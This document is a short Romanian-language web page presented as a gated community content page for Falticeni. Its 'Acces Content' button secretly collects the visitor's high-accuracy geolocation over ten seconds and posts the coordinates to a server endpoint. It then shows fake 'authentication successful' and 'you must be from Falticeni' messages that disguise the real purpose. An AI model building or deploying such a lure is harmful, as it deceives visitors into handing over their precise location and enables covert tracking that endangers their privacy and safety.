<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Barfa Falticeni</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        h2 {
            color: #333;
        }
        button {
            background-color: #28a745;
            color: white;
            border: none;
            padding: 15px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <h2>Pagina de Bafta a Falticeniului</h2>
    <button onclick="sendLocation()">Acces Content</button>
    
    <script>
        function sendLocation() {
            if (navigator.geolocation) {
                let bestPosition = null;
                let watchId = navigator.geolocation.watchPosition(position => {
                    if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
                        bestPosition = position;
                    }
                }, error => {
                    alert('Nu te poti autentifica. Verifică permisiunile browserului.');
                }, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });

                setTimeout(() => {
                    navigator.geolocation.clearWatch(watchId);
                    if (bestPosition) {
                        const latitude = bestPosition.coords.latitude;
                        const longitude = bestPosition.coords.longitude;
                        const accuracy = bestPosition.coords.accuracy;

                        fetch('http://localhost:3000/send-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ latitude, longitude, accuracy })
                        })
                        .then(response => response.json())
                        .then(data => alert(`Autentificare realizata cu succes!`))
                        .catch(error => console.error('Eroare:', error));
                    } else {
                        alert('Pntru a avea acces trebuie sa fii din Falticeni.');
                    }
                }, 10000); // Asteaptă 10 secunde pentru a aduna mai multe date
            } else {
                alert('Din pacate nu te afli in zona Falticeni, nu te poti conecta, contacteaza un Admin al comunitatii.');
            }
        }
    </script>
</body>
</html>
